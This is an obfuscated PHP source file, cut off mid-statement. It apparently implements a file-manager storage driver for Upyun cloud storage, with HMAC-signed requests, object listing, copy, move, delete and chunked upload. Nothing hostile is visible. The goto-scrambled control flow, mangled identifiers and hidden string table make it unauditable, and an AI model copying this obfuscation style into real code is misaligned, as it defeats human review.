<?php
 goto bÀˆÎêƒ’õ; E“Í¤ÛäÓ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($DÉƒª‘Ó‘†, $F¨š¥¤‚•­ = 0) { parent::__construct(); $this->source = $DÉƒª‘Ó‘†; $this->sourceSize = $F¨š¥¤‚•­; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($e˜éƒ‡¤—Ï = false) { return $this->sourceSize; } public function getContent($Bâ˜Šøòñ¿ = false) { return $this->fileSubstr($Bâ˜Šøòñ¿, 0, $this->sourceSize); } public function fileSubstr($fØ’š ôó‰ = false, $FçŒĞàÙ‚ = 0, $E˜â½‹Æ¼Ç = 0) { if (!$E˜â½‹Æ¼Ç) { $E˜â½‹Æ¼Ç = $this->sourceSize; } $D¿­­Î‘İ = $this->sourceSize - $FçŒĞàÙ‚; if ($E˜â½‹Æ¼Ç >= $D¿­­Î‘İ) { $E˜â½‹Æ¼Ç = $D¿­­Î‘İ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $FçŒĞàÙ‚, $E˜â½‹Æ¼Ç); } if ($this->sourceType == self::TYPE_FILE) { if ($E˜â½‹Æ¼Ç <= 0) { return $_SERVER[¢ÌÛ][33]; } $bŸ¬ßÜŞ¿â = ftell($this->source); fseek_64($this->source, $bŸ¬ßÜŞ¿â + $FçŒĞàÙ‚); $dƒä›»ê‰ = @fread($this->source, $E˜â½‹Æ¼Ç); fseek_64($this->source, $bŸ¬ßÜŞ¿â); return $dƒä›»ê‰; } } public function hashMd5($C²ÑËÖç‡® = false) { return md5($this->getContent()); } public static function hash($b¶˜Æ§¼, $c†Ú‡œ¢ = 0) { $bÃìÁÚˆ­‘ = new PathDriverStream($b¶˜Æ§¼, $c†Ú‡œ¢); return $bÃìÁÚˆ­‘->hashSimple($b¶˜Æ§¼); } public static function md5($cóâ‹¸Ãñç, $Cœ­Ø™…ï„ = 0) { $e’’Í£‡ÒŒ = new PathDriverStream($cóâ‹¸Ãñç, $Cœ­Ø™…ï„); return $e’’Í£‡ÒŒ->hashMd5($cóâ‹¸Ãñç); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\72\57\57\166\x30\56\x61\x70\151\56\165\x70\x79\x75\x6e\56\143\x6f\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($c×²¬§¯à¨) { parent::__construct(); $this->_init($c×²¬§¯à¨); } public function _init($a¿»¦ÄÏ»è) { $FÛØ‹å¨´” =& $_SERVER[¢ÌÛ]; foreach ($a¿»¦ÄÏ»è as $dšÑÆ˜Ş´Ï => $eŸ²¯¨İ§é) { if (isset($this->{$dšÑÆ˜Ş´Ï})) { $this->{$dšÑÆ˜Ş´Ï} = $eŸ²¯¨İ§é; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($FÛØ‹å¨´”[1301] . LNG($FÛØ‹å¨´”[1233])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($A•Ö–ñ½Á, $C‰°áÔªÓÌ = "\x47\x45\124") { $FµµÛàõÂí =& $_SERVER[¢ÌÛ]; $bÍ™•Ã£İ‘ = gmdate($FµµÛàõÂí[1267]); $c–ößìƒì = base64_encode(hash_hmac($FµµÛàõÂí[1302], "{$C‰°áÔªÓÌ}\x26{$A•Ö–ñ½Á}\46{$bÍ™•Ã£İ‘}", md5("{$this->userpass}"), !0)); $DÉ±ç«ß„ = array("\x41\x75\x74\x68\x6f\x72\x69\172\141\x74\x69\x6f\156\x3a\125\x50\x59\125\116\40{$this->username}\72{$c–ößìƒì}", "\x44\141\x74\x65\x3a{$bÍ™•Ã£İ‘}"); return $DÉ±ç«ß„; } public function ussRequest($dÜÈšÙÑ¡§, $fáïƒ«Í¸ƒ = "\107\105\x54", $DÚ·¨Í³ÙÓ = false, $FèÛó“¶Õ = false, $EøòÉ¶Ñ = false) { goto a”ìââÛ Ú; c­ÉŸµŸÑ: $DÓ²¸´¶™ = $this->ussHeaders($EŸ¤Š®òë­, $fáïƒ«Í¸ƒ); if ($FèÛó“¶Õ) { $DÓ²¸´¶™ = array_merge($DÓ²¸´¶™, $FèÛó“¶Õ); } $dƒ¤“ ä  = url_request($this->endpoint . $EŸ¤Š®òë­, $fáïƒ«Í¸ƒ, $DÚ·¨Í³ÙÓ, $DÓ²¸´¶™, $EøòÉ¶Ñ); goto d¹‘ª•ÇŒ˜; d¹‘ª•ÇŒ˜: if (!$dƒ¤“ ä ) { return array($aŠÜáÔâï¾[1062] => !1, $aŠÜáÔâï¾[1064] => $aŠÜáÔâï¾[1303]); } if (strtolower($fáïƒ«Í¸ƒ) == $aŠÜáÔâï¾[190] || in_array($dƒ¤“ ä [$aŠÜáÔâï¾[1062]], array($aŠÜáÔâï¾[1161], $aŠÜáÔâï¾[1304]))) { $DÚ·¨Í³ÙÓ = $dƒ¤“ ä [$aŠÜáÔâï¾[1305]]; } else { $DÚ·¨Í³ÙÓ = json_decode($dƒ¤“ ä [$aŠÜáÔâï¾[1064]], !0); if (!$DÚ·¨Í³ÙÓ) { $DÚ·¨Í³ÙÓ = $dƒ¤“ ä [$aŠÜáÔâï¾[1064]]; } else { if (!$dƒ¤“ ä [$aŠÜáÔâï¾[712]] && isset($DÚ·¨Í³ÙÓ[$aŠÜáÔâï¾[1306]])) { $DÚ·¨Í³ÙÓ = $DÚ·¨Í³ÙÓ[$aŠÜáÔâï¾[1306]]; } } } return array($aŠÜáÔâï¾[1062] => $dƒ¤“ ä [$aŠÜáÔâï¾[712]], $aŠÜáÔâï¾[1064] => $DÚ·¨Í³ÙÓ); goto F…¬Öñ›é“; a”ìââÛ Ú: $aŠÜáÔâï¾ =& $_SERVER[¢ÌÛ]; $dÜÈšÙÑ¡§ = trim($dÜÈšÙÑ¡§, $aŠÜáÔâï¾[8]); $EŸ¤Š®òë­ = "\57{$this->bucket}\x2f{$dÜÈšÙÑ¡§}"; goto c­ÉŸµŸÑ; F…¬Öñ›é“: } public function mkfile($eäî“©ÎŞ¥, $a¸…§åÍñ† = '', $E‹Ğ»“áŞø = REPEAT_RENAME) { if ($this->setContent($eäî“©ÎŞ¥, $a¸…§åÍñ†)) { return $this->getPathOuter($eäî“©ÎŞ¥); } return !1; } public function mkdir($E“ËÍ‘—‚Ş, $c‘ùì¯·˜ = REPEAT_SKIP) { $CñÒ‹¶Ôî =& $_SERVER[¢ÌÛ]; $B±Öğ¦åë = trim($E“ËÍ‘—‚Ş, $CñÒ‹¶Ôî[8]); if ($this->_isFolder($B±Öğ¦åë)) { return $this->getPathOuter($B±Öğ¦åë); } $dˆ‡¨Ú„¹ù = array($CñÒ‹¶Ôî[1307]); $fƒ¦‡†÷Æ¯ = $this->ussRequest($B±Öğ¦åë, $CñÒ‹¶Ôî[222], !1, $dˆ‡¨Ú„¹ù); return $fƒ¦‡†÷Æ¯[$CñÒ‹¶Ôî[1062]] ? $this->getPathOuter($B±Öğ¦åë) : !1; } public function copyFile($a‹Ğî¥òËÁ, $e‘’³õºéŒ) { $A†ˆ¯Ëš =& $_SERVER[¢ÌÛ]; $aÂ—ˆŞ”ˆÂ = array($A†ˆ¯Ëš[1308] . "\57{$this->bucket}\57{$a‹Ğî¥òËÁ}", $A†ˆ¯Ëš[1309]); $A„ÃÅ‰¨Ïè = $this->ussRequest($e‘’³õºéŒ, $A†ˆ¯Ëš[224], !1, $aÂ—ˆŞ”ˆÂ); return $A„ÃÅ‰¨Ïè[$A†ˆ¯Ëš[1062]] ? !0 : $this->getPathOuter($e‘’³õºéŒ); } public function moveFile($fóÆ“©«æ, $FËƒàà¯±è) { $fé¾Ö–ÀÊØ =& $_SERVER[¢ÌÛ]; $b´¬“î‡íÊ = array($fé¾Ö–ÀÊØ[1310] . "\57{$this->bucket}\57{$fóÆ“©«æ}", $fé¾Ö–ÀÊØ[1309]); $dƒ·¢¬Ï§¤ = $this->ussRequest($FËƒàà¯±è, $fé¾Ö–ÀÊØ[224], !1, $b´¬“î‡íÊ); return $dƒ·¢¬Ï§¤[$fé¾Ö–ÀÊØ[1062]] ? !0 : $this->getPathOuter($FËƒàà¯±è); } public function delFile($c”Â…ˆ¦®ã) { $Eá›µªÉµš =& $_SERVER[¢ÌÛ]; $C¬Ò‰ÂïÍ‘ = $this->ussRequest($c”Â…ˆ¦®ã, $Eá›µªÉµš[1311]); return $C¬Ò‰ÂïÍ‘[$Eá›µªÉµš[1062]] ? !0 : !1; } public function delFolder($aˆ”¯œ‚ïî) { goto E¼ŠÕĞŠÆ; C Ÿ¤éÃ×Ü: foreach ($aÓ²àù®« as $b§Â»Œ©) { $eèÄĞàæ… = $this->ussRequest($b§Â»Œ©[$f±õÇŸòÉ[28]], $f±õÇŸòÉ[1311]); if (!$eèÄĞàæ…[$f±õÇŸòÉ[1062]]) { return !1; } } foreach ($Fµáäæ¢É† as $d„¨–ëè¬†) { $eèÄĞàæ… = $this->ussRequest($d„¨–ëè¬†, $f±õÇŸòÉ[1311]); if (!$eèÄĞàæ…[$f±õÇŸòÉ[1062]]) { return !1; } } $eèÄĞàæ… = $this->ussRequest($aˆ”¯œ‚ïî, $f±õÇŸòÉ[1311]); goto a™ëö’¬¦ñ; a™ëö’¬¦ñ: return $eèÄĞàæ…[$f±õÇŸòÉ[1062]]; goto a  Ãö³»; c‡±¼Õ…¥İ: $Fµáäæ¢É† = $aÓ²àù®« = array(); $this->fileList($aˆ”¯œ‚ïî, $Fµáäæ¢É†, $aÓ²àù®«, !0); $this->listItemCache = !0; goto C Ÿ¤éÃ×Ü; E¼ŠÕĞŠÆ: $f±õÇŸòÉ =& $_SERVER[¢ÌÛ]; if (!$this->exist($aˆ”¯œ‚ïî)) { return !0; } $this->listItemCache = !1; goto c‡±¼Õ…¥İ; a  Ãö³»: } public function rename($b³é„¬¨ã‰, $FĞÍ‡¦¨¸) { if ($this->isFile($b³é„¬¨ã‰)) { $FĞÍ‡¦¨¸ = get_path_father($b³é„¬¨ã‰) . $FĞÍ‡¦¨¸; return $this->moveFile($b³é„¬¨ã‰, $FĞÍ‡¦¨¸); } return $this->renameObject($b³é„¬¨ã‰, $FĞÍ‡¦¨¸); } public function fileInfo($BÈ¶íñ²Ã, $cŠ×ô¦é’å = false, $bºÛÛ‰± = array()) { goto còÉìÂ‹¼ì; còÉìÂ‹¼ì: $dÌÚ‚õùƒ‡ =& $_SERVER[¢ÌÛ]; $A®Ò¬èÛ¹ç = array($dÌÚ‚õùƒ‡[28] => $this->pathThis($BÈ¶íñ²Ã), $dÌÚ‚õùƒ‡[75] => $this->getPathOuter($dÌÚ‚õùƒ‡[8] . $BÈ¶íñ²Ã), $dÌÚ‚õùƒ‡[29] => $dÌÚ‚õùƒ‡[173], $dÌÚ‚õùƒ‡[77] => isset($bºÛÛ‰±[$dÌÚ‚õùƒ‡[77]]) ? $bºÛÛ‰±[$dÌÚ‚õùƒ‡[77]] : 0, $dÌÚ‚õùƒ‡[167] => $this->ext($BÈ¶íñ²Ã)); if ($cŠ×ô¦é’å) { return $A®Ò¬èÛ¹ç; } goto BàÌÑ¼êéŒ; d‘ÄØ”éÌË: return $A®Ò¬èÛ¹ç; goto A®‘‹áÃ†à; f¬ÛÖƒ¤¯µ: $A®Ò¬èÛ¹ç[$dÌÚ‚õùƒ‡[192]] = intval($bºÛÛ‰±[$dÌÚ‚õùƒ‡[1312]]); $A®Ò¬èÛ¹ç[$dÌÚ‚õùƒ‡[83]] = intval($bºÛÛ‰±[$dÌÚ‚õùƒ‡[1313]]); $A®Ò¬èÛ¹ç[$dÌÚ‚õùƒ‡[77]] = $bºÛÛ‰±[$dÌÚ‚õùƒ‡[77]]; goto d‘ÄØ”éÌË; BàÌÑ¼êéŒ: $A®Ò¬èÛ¹ç[$dÌÚ‚õùƒ‡[192]] = $A®Ò¬èÛ¹ç[$dÌÚ‚õùƒ‡[83]] = 0; $A®Ò¬èÛ¹ç[$dÌÚ‚õùƒ‡[193]] = $A®Ò¬èÛ¹ç[$dÌÚ‚õùƒ‡[194]] = !0; if (empty($bºÛÛ‰±)) { $bºÛÛ‰± = $this->objectMeta($BÈ¶íñ²Ã); if (!$bºÛÛ‰±) { return $A®Ò¬èÛ¹ç; } } goto f¬ÛÖƒ¤¯µ; A®‘‹áÃ†à: } public function folderInfo($e’†®Øê×, $cÒ±„³ôª¢ = false) { goto e”˜é¢ˆõ©; e”˜é¢ˆõ©: $E¥ò÷ô”ç™ =& $_SERVER[¢ÌÛ]; $Aì¨¬ï½ö = array($E¥ò÷ô”ç™[28] => $this->pathThis($e’†®Øê×), $E¥ò÷ô”ç™[75] => $this->getPathOuter($E¥ò÷ô”ç™[8] . $e’†®Øê×), $E¥ò÷ô”ç™[29] => $E¥ò÷ô”ç™[76]); if ($cÒ±„³ôª¢) { return $Aì¨¬ï½ö; } goto C›ìÉòŞ—º; C›ìÉòŞ—º: $Aì¨¬ï½ö[$E¥ò÷ô”ç™[192]] = $Aì¨¬ï½ö[$E¥ò÷ô”ç™[83]] = 0; $Aì¨¬ï½ö[$E¥ò÷ô”ç™[193]] = $Aì¨¬ï½ö[$E¥ò÷ô”ç™[194]] = !0; if (empty($a¬¹˜›æ—)) { $a¬¹˜›æ— = $this->objectMeta($e’†®Øê×); if (!$a¬¹˜›æ—) { return $Aì¨¬ï½ö; } } goto eŠĞèéˆ÷¢; eŠĞèéˆ÷¢: $Aì¨¬ï½ö[$E¥ò÷ô”ç™[192]] = intval($a¬¹˜›æ—[$E¥ò÷ô”ç™[1312]]); $Aì¨¬ï½ö[$E¥ò÷ô”ç™[83]] = intval($a¬¹˜›æ—[$E¥ò÷ô”ç™[1313]]); return $Aì¨¬ï½ö; goto c­æ¹—ë½; c­æ¹—ë½: } private function listObjs($F³ËñÕñİ”, $bä÷”„ˆÖ = 0, $bñ†Ü¼  = 1000) { $FÀéŒº±ó‡ =& $_SERVER[¢ÌÛ]; $eßÃÉ¢Á = array($FÀéŒº±ó‡[1314], $FÀéŒº±ó‡[1315] . $bñ†Ü¼ ); if ($bä÷”„ˆÖ) { $eßÃÉ¢Á[] = $FÀéŒº±ó‡[1316] . $bä÷”„ˆÖ; } $B£Í¶îËğØ = $this->ussRequest($F³ËñÕñİ”, $FÀéŒº±ó‡[226], !1, $eßÃÉ¢Á); return !$B£Í¶îËğØ[$FÀéŒº±ó‡[1062]] ? !1 : $B£Í¶îËğØ[$FÀéŒº±ó‡[1064]]; } private function fileList($AÏêÊºŞ‘, &$D²’§„çĞ·, &$eôß†í‘­õ, $d·çâÃÕŞâ = false) { goto cŒÔõ‹®¹Ä; dÇì†Û‚Ì°: $bãáÍÓÑÁ£ = rtrim($AÏêÊºŞ‘, $e„ï“¼È™˜[8]) . $e„ï“¼È™˜[8]; $BñØÕé†Ÿ˜ = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $cï£ƒİã‚ = $this->listObjs($AÏêÊºŞ‘, $AÂÓ˜è¦”›, $c¤ ×ºÓÍÍ); if (!$cï£ƒİã‚) { return !1; } $AÂÓ˜è¦”› = isset($cï£ƒİã‚[$e„ï“¼È™˜[1317]]) ? $cï£ƒİã‚[$e„ï“¼È™˜[1317]] : $e„ï“¼È™˜[33]; $bš¢ãŸô± = isset($cï£ƒİã‚[$e„ï“¼È™˜[1318]]) ? $cï£ƒİã‚[$e„ï“¼È™˜[1318]] : array(); foreach ($bš¢ãŸô± as $C«Õ›ôÅ–) { $B›‘Ñ¢áÒù = $C«Õ›ôÅ–[$e„ï“¼È™˜[29]] == $e„ï“¼È™˜[76] ? !0 : !1; $E‹Â©ÓÂ°’ = ltrim($bãáÍÓÑÁ£ . $C«Õ›ôÅ–[$e„ï“¼È™˜[28]], $e„ï“¼È™˜[8]) . ($B›‘Ñ¢áÒù ? $e„ï“¼È™˜[8] : $e„ï“¼È™˜[33]); $E¼¹·—§•¼ = array($e„ï“¼È™˜[28] => $E‹Â©ÓÂ°’, $e„ï“¼È™˜[29] => $B›‘Ñ¢áÒù ? $e„ï“¼È™˜[76] : $e„ï“¼È™˜[173], $e„ï“¼È™˜[77] => $C«Õ›ôÅ–[$e„ï“¼È™˜[333]], $e„ï“¼È™˜[1313] => $C«Õ›ôÅ–[$e„ï“¼È™˜[1319]]); if ($BñØÕé†Ÿ˜) { $this->cacheMethod($e„ï“¼È™˜[197], $E‹Â©ÓÂ°’, $B›‘Ñ¢áÒù); $this->cacheMethod($e„ï“¼È™˜[198], $E‹Â©ÓÂ°’, $E¼¹·—§•¼); } if ($B›‘Ñ¢áÒù) { $D²’§„çĞ·[] = $E‹Â©ÓÂ°’; if ($d·çâÃÕŞâ) { $this->fileList($E‹Â©ÓÂ°’, $D²’§„çĞ·, $eôß†í‘­õ, $d·çâÃÕŞâ); } continue; } $eôß†í‘­õ[] = $E¼¹·—§•¼; } if (count($bš¢ãŸô±) < $c¤ ×ºÓÍÍ) { break; } } goto AÒˆ¯î£ÅÀ; AÒˆ¯î£ÅÀ: if ($BñØÕé†Ÿ˜) { $this->cacheMethod($e„ï“¼È™˜[197], $AÏêÊºŞ‘, !0); } goto dğªÍôÍá; cŒÔõ‹®¹Ä: $e„ï“¼È™˜ =& $_SERVER[¢ÌÛ]; $AÂÓ˜è¦”› = $e„ï“¼È™˜[33]; $c¤ ×ºÓÍÍ = 1000; goto dÇì†Û‚Ì°; dğªÍôÍá: } public function listPath($E§¯ñ÷ùœ, $AÀã®õ™ºÚ = false) { $C¬Ó²¿°İÆ =& $_SERVER[¢ÌÛ]; $BÇİŠ•š¶» = $a¬ ÖÃÂ°å = array(); $this->fileList($E§¯ñ÷ùœ, $BÇİŠ•š¶», $a¬ ÖÃÂ°å); foreach ($BÇİŠ•š¶» as $CƒÏÙİ—ë => $fÃ›Ñó†“†) { $BÇİŠ•š¶»[$CƒÏÙİ—ë] = $this->folderInfo($fÃ›Ñó†“†, $AÀã®õ™ºÚ); } foreach ($a¬ ÖÃÂ°å as $CƒÏÙİ—ë => $fÃ›Ñó†“†) { $a¬ ÖÃÂ°å[$CƒÏÙİ—ë] = $this->fileInfo($fÃ›Ñó†“†[$C¬Ó²¿°İÆ[28]], $AÀã®õ™ºÚ, $fÃ›Ñó†“†); } return array($C¬Ó²¿°İÆ[74] => $BÇİŠ•š¶», $C¬Ó²¿°İÆ[73] => $a¬ ÖÃÂ°å); } public function has($Còìâïë«µ, $A–ÑÅÛÁçƒ = false, $B™ôéªŠåÎ = true) { goto Cï§¡‚×Ñ·; Cï§¡‚×Ñ·: $ešÀ†Øöæ­ =& $_SERVER[¢ÌÛ]; $eŒñŒ•°Ïµ = $ešÀ†Øöæ­[33]; $eØ­×íæ„ï = 500; goto DâØÎñ…; DâØÎñ…: $fÃ­‹åššÈ = 0; $cÌÃÎù×ˆØ = 0; $c‹éÏì» = rtrim($Còìâïë«µ, $ešÀ†Øöæ­[8]) . $ešÀ†Øöæ­[8]; goto b†¬¼®À ; b†¬¼®À : while (!0) { check_abort(); $a—ÕÅ§ö´– = $this->listObjs($Còìâïë«µ, $eŒñŒ•°Ïµ, $eØ­×íæ„ï); if (!$a—ÕÅ§ö´–) { return !1; } $eŒñŒ•°Ïµ = isset($a—ÕÅ§ö´–[$ešÀ†Øöæ­[1317]]) ? $a—ÕÅ§ö´–[$ešÀ†Øöæ­[1317]] : $ešÀ†Øöæ­[33]; $b§°óùÏ¶ = isset($a—ÕÅ§ö´–[$ešÀ†Øöæ­[1318]]) ? $a—ÕÅ§ö´–[$ešÀ†Øöæ­[1318]] : array(); if (empty($b§°óùÏ¶)) { break; } $FÔ›»¦Ëš¢ = array_filter($b§°óùÏ¶, function ($B…®£›³Ì—) { $CëÂœæ”ª =& $_SERVER[¢ÌÛ]; return $B…®£›³Ì—[$CëÂœæ”ª[29]] == $CëÂœæ”ª[76]; }); $cãòõ¸²á« = count($b§°óùÏ¶); $FÔ›»¦Ëš¢ = count($FÔ›»¦Ëš¢); $d»º¼¹öÍ = $cãòõ¸²á« - $FÔ›»¦Ëš¢; if ($A–ÑÅÛÁçƒ) { $cÌÃÎù×ˆØ += $FÔ›»¦Ëš¢; $fÃ­‹åššÈ += $d»º¼¹öÍ; if ($cãòõ¸²á« < $eØ­×íæ„ï) { break; } continue; } if ($B™ôéªŠåÎ) { if ($d»º¼¹öÍ) { return !0; } } else { if ($FÔ›»¦Ëš¢) { return !0; } } if ($cãòõ¸²á« < $eØ­×íæ„ï) { break; } } if ($A–ÑÅÛÁçƒ) { return array($ešÀ†Øöæ­[201] => $fÃ­‹åššÈ, $ešÀ†Øöæ­[202] => $cÌÃÎù×ˆØ); } return !1; goto f’¼İãµÈ‚; f’¼İãµÈ‚: } public function listAll($cî‹”ã¢ãˆ) { goto eì÷ï…‹’õ; BÙ˜¤ºº‹: $C÷ŒÈ‹ÛÑé = array(); foreach ($aååå¬Ş®˜ as $eÈ„àÛ—Úø) { $C÷ŒÈ‹ÛÑé[$eÈ„àÛ—Úø[$fĞåÅËœ”ˆ[28]]] = $eÈ„àÛ—Úø[$fĞåÅËœ”ˆ[77]]; } foreach ($e–±Í¾ª± as $eÈ„àÛ—Úø) { if (is_string($eÈ„àÛ—Úø)) { $C÷ŒÈ‹ÛÑé[$eÈ„àÛ—Úø] = 0; } } goto DÕ¯ÑŒçË¦; eì÷ï…‹’õ: $fĞåÅËœ”ˆ =& $_SERVER[¢ÌÛ]; $e–±Í¾ª± = $aååå¬Ş®˜ = array(); $this->fileList($cî‹”ã¢ãˆ, $e–±Í¾ª±, $aååå¬Ş®˜, !0); goto BÙ˜¤ºº‹; DÕ¯ÑŒçË¦: return $this->listAllFiles($cî‹”ã¢ãˆ, array_keys($C÷ŒÈ‹ÛÑé), $C÷ŒÈ‹ÛÑé); goto Eö˜ÏÂÙÑ; Eö˜ÏÂÙÑ: } public function canRead($C¥™‡Îä¥) { return $this->exist($C¥™‡Îä¥) ? !0 : !1; } public function canWrite($b°ğ’Üòã…) { return $this->exist($b°ğ’Üòã…) ? !0 : !1; } public function getContent($F±œá˜†µæ) { return $this->fileSubstr($F±œá˜†µæ, 0, -1); } public function setContent($f‡àÓÊä„», $d×‚Ÿ‰¥‰ = '') { $Fàì«êÛœö =& $_SERVER[¢ÌÛ]; if (!$d×‚Ÿ‰¥‰) { $fŒ¨÷ì‚êÇ = $this->ussRequest($f‡àÓÊä„», $Fàì«êÛœö[222]); return $fŒ¨÷ì‚êÇ[$Fàì«êÛœö[1062]]; } $Dª‘ÌĞ„Îô = $this->tempFile($this->pathThis($f‡àÓÊä„»)); file_put_contents($Dª‘ÌĞ„Îô, $d×‚Ÿ‰¥‰); if ($this->upload($f‡àÓÊä„», $Dª‘ÌĞ„Îô)) { $this->tempFileRemve($Dª‘ÌĞ„Îô); return !0; } return !1; } public function fileSubstr($F‘ïííˆ, $d†‘ğ‚ñª÷, $Fâ†Ï›Ì†Ÿ) { $eÂÒå²ğºŒ =& $_SERVER[¢ÌÛ]; if (!($f’‡“‹âÅ™ = $this->link($F‘ïííˆ))) { return !1; } $cÏÎ¬ª„¯Ö = !1; if ($Fâ†Ï›Ì†Ÿ > 0) { $Cäåõ²’¶ = $d†‘ğ‚ñª÷ + $Fâ†Ï›Ì†Ÿ - 1; $cÏÎ¬ª„¯Ö = array($eÂÒå²ğºŒ[1280] . $d†‘ğ‚ñª÷ . $eÂÒå²ğºŒ[438] . $Cäåõ²’¶); } $F­®ïùŞƒì = url_request($f’‡“‹âÅ™, $eÂÒå²ğºŒ[226], !1, $cÏÎ¬ª„¯Ö); return $F­®ïùŞƒì[$eÂÒå²ğºŒ[712]] ? $F­®ïùŞƒì[$eÂÒå²ğºŒ[1064]] : !1; } public function upload($bÏÉ»•ŠÎÈ, $E³‰…ÚŞÆ, $F¤šÉó÷Ÿô = false, $e°õÒ‹Ğãõ = REPEAT_REPLACE) { goto BØ¥ÜÁ¿§Ö; b÷‹Îçƒ¹: $d…Ğ¯Ê™¦½ = $this->ussRequest($bÏÉ»•ŠÎÈ, $F÷‰‚ÚÊÃ‰[224], !1, $f“ÔïÍÎ‹·); return $d…Ğ¯Ê™¦½[$F÷‰‚ÚÊÃ‰[1062]] ? $this->getPathOuter($BôëßÂ²®©) : !1; goto b‡øáñÑ¡Œ; fŒƒÆë½ÏÉ: if (!$d…Ğ¯Ê™¦½[$F÷‰‚ÚÊÃ‰[1062]]) { return !1; } $bÉ«¥îğ¸¬ = $d…Ğ¯Ê™¦½[$F÷‰‚ÚÊÃ‰[1064]]; $C„¿Ë½ˆ‘¨ = 0; goto fÙÇÛÍ¸ª”; aëçØÚµ¦: $cä‚‹Ÿ°’õ = 1024 * 1024 * 10; $f“ÔïÍÎ‹· = array($F÷‰‚ÚÊÃ‰[1321], $F÷‰‚ÚÊÃ‰[1322] . $A¥Çò©ÜÚ¹, $F÷‰‚ÚÊÃ‰[1323], $F÷‰‚ÚÊÃ‰[1324] . $cä‚‹Ÿ°’õ); $d…Ğ¯Ê™¦½ = $this->ussRequest($bÏÉ»•ŠÎÈ, $F÷‰‚ÚÊÃ‰[224], !1, $f“ÔïÍÎ‹·); goto fŒƒÆë½ÏÉ; fÙÇÛÍ¸ª”: $AÚ „ŞÇ£ = $bÉ«¥îğ¸¬[$F÷‰‚ÚÊÃ‰[1325]]; $d¥¬³£¼¢÷ = fopen($E³‰…ÚŞÆ, $F÷‰‚ÚÊÃ‰[1230]); if (!$d¥¬³£¼¢÷) { return !1; } goto C’âíİùÍñ; C’âíİùÍñ: do { $eÆ¬›ˆ¦‡ = $bÉ«¥îğ¸¬[$F÷‰‚ÚÊÃ‰[1326]]; fseek_64($d¥¬³£¼¢÷, $C„¿Ë½ˆ‘¨); $cãÑ„¸âì— = fread($d¥¬³£¼¢÷, $eÆ¬›ˆ¦‡); $B˜ŠœË¶†å = 0; do { $B˜ŠœË¶†å++; $bÉ«¥îğ¸¬ = $this->uploadPart($bÏÉ»•ŠÎÈ, $bÉ«¥îğ¸¬, $cãÑ„¸âì—); } while (!$bÉ«¥îğ¸¬ && $B˜ŠœË¶†å < 3); if (!$bÉ«¥îğ¸¬) { return !1; } $AÚ „ŞÇ£ = $bÉ«¥îğ¸¬[$F÷‰‚ÚÊÃ‰[1325]]; $C„¿Ë½ˆ‘¨ += $eÆ¬›ˆ¦‡; } while ($AÚ „ŞÇ£ != -1); fclose($d¥¬³£¼¢÷); $f“ÔïÍÎ‹· = array($F÷‰‚ÚÊÃ‰[1327], $F÷‰‚ÚÊÃ‰[1328] . $bÉ«¥îğ¸¬[$F÷‰‚ÚÊÃ‰[1329]], $F÷‰‚ÚÊÃ‰[1323]); goto b÷‹Îçƒ¹; BØ¥ÜÁ¿§Ö: $F÷‰‚ÚÊÃ‰ =& $_SERVER[¢ÌÛ]; $A¥Çò©ÜÚ¹ = IO::size($E³‰…ÚŞÆ); if ($A¥Çò©ÜÚ¹ <= 1024 * 1024 * 200) { $AÙÄœïŒ½Ú = array($F÷‰‚ÚÊÃ‰[1320] . $E³‰…ÚŞÆ); $d…Ğ¯Ê™¦½ = $this->ussRequest($bÏÉ»•ŠÎÈ, $F÷‰‚ÚÊÃ‰[224], $AÙÄœïŒ½Ú); return $d…Ğ¯Ê™¦½[$F÷‰‚ÚÊÃ‰[1062]] ? $this->getPathOuter($bÏÉ»•ŠÎÈ) : !1; } goto aëçØÚµ¦; b‡øáñÑ¡Œ: } private function uploadPart($bØìÏÍ‚„, $a‡¢‹¯Î×æ, &$eÃŠ˜ƒµŒ¼) { $bÉƒÜˆÒ‹† =& $_SERVER[¢ÌÛ]; $f“õ©¸¼™Ê = array($bÉƒÜˆÒ‹†[1330], $bÉƒÜˆÒ‹†[1328] . $a‡¢‹¯Î×æ[$bÉƒÜˆÒ‹†[1329]], $bÉƒÜˆÒ‹†[1331] . $a‡¢‹¯Î×æ[$bÉƒÜˆÒ‹†[1325]], $bÉƒÜˆÒ‹†[140] . $a‡¢‹¯Î×æ[$bÉƒÜˆÒ‹†[1326]]); $c„á÷ãÌªÂ = $this->ussRequest($bØìÏÍ‚„, $bÉƒÜˆÒ‹†[224], $eÃŠ˜ƒµŒ¼, $f“õ©¸¼™Ê); return !$c„á÷ãÌªÂ[$bÉƒÜˆÒ‹†[1062]] ? $c„á÷ãÌªÂ[$bÉƒÜˆÒ‹†[1062]] : $c„á÷ãÌªÂ[$bÉƒÜˆÒ‹†[1064]]; } public function uploadFormData($fñœ‘¢“«Å, $CŞ†’ØËŞã = 3600) { return $this->uploadPolicy($fñœ‘¢“«Å, $CŞ†’ØËŞã); } public function multiUploadFormData($BµÙ³†‘±‘, $F¥Ñßß¸‚¢ = 3600) { $bŒ‰“×“ÜË =& $_SERVER[¢ÌÛ]; $AÖè¯²”œ = (int) $GLOBALS[$bŒ‰“×“ÜË[7]][$bŒ‰“×“ÜË[77]]; return $this->uploadPolicy($BµÙ³†‘±‘, $F¥Ñßß¸‚¢, $AÖè¯²”œ); } private function uploadPolicy($dŞ´òàóÌ…, $fÕ¨±ŒÈâ… = 3600, $e‡ÖÆß±ÅÅ = 0) { goto bÄ“ò§Ì­…; eÆŸ™‰ƒ¡º: $Bõ»Ë¡Ä× = base64_encode(hash_hmac($aš÷ØØù Ğ[1302], "\120\117\123\124\x26{$BÍ™ØƒÖ‰ì}\46{$eäï‰„˜‡Ì}\x26{$FÈÕãƒ¨¿¦}", md5("{$this->userpass}"), !0)); $fæÄ£èÒÔÊ = array($aš÷ØØù Ğ[1173] => $FÈÕãƒ¨¿¦, $aš÷ØØù Ğ[1336] => 